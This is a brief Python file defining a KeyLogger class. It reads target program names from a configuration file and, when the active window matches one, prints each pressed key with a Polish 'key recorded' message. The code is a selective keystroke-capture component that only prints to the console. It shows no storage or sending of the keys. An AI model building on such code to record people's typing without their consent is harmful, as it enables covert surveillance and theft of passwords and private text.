import ConfigIni

class KeyLogger:

    def getProgramsName(self):
        config = ConfigIni.GetConfiguration()
        return config.getItems('Windows')

    def interestingProgram(self, name, pattern):
        name = str(name).upper()
        name = name.replace('"', "");

        pattern = pattern.upper()
        result = pattern.find(name)

        if(result != -1):
            return True
        else:
            return False

    def echo(self, event):
        patternProgramName = self.getProgramsName()

        for key, programName in patternProgramName:
            if(self.interestingProgram(programName, event.WindowName)):
                print('Odnotowano Key:', event.Key)

        return True
